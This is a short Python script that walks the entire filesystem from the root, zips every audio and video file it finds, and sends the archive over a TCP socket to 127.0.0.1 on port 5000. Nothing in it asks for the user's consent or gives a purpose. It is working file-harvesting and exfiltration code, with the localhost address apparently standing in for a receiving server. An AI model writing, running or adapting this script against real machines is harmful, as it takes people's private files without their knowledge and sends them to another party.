import os
import socket
import zipfile

# Get the root directory
root_directory = os.path.abspath('/')

# Set the media extensions to filter
media_extensions = [".mp3", ".mp4", ".wav", ".avi"]

# Create a ZipFile object to save the media files to
zip_file_path = 'media_files.zip'
with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
    # Walk through every directory and file in the root directory
    for directory_path, directory_names, file_names in os.walk(root_directory):
        # Filter the files by extension
        media_files = [os.path.join(directory_path, file_name) for file_name in file_names if os.path.splitext(file_name)[1] in media_extensions]
        # Add the media files to the zip file
        for media_file in media_files:
            try:
                zip_file.write(media_file)
            except PermissionError:
                print(f"Permission denied for file: {media_file}")

print(f'Media files saved to {zip_file_path}')

# Send the zip file to a server
ip_address = '127.0.0.1'
port = 5000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((ip_address, port))
    with open(zip_file_path, 'rb') as file:
        data = file.read()
        sock.sendall(data)

print('Zip file sent successfully.')
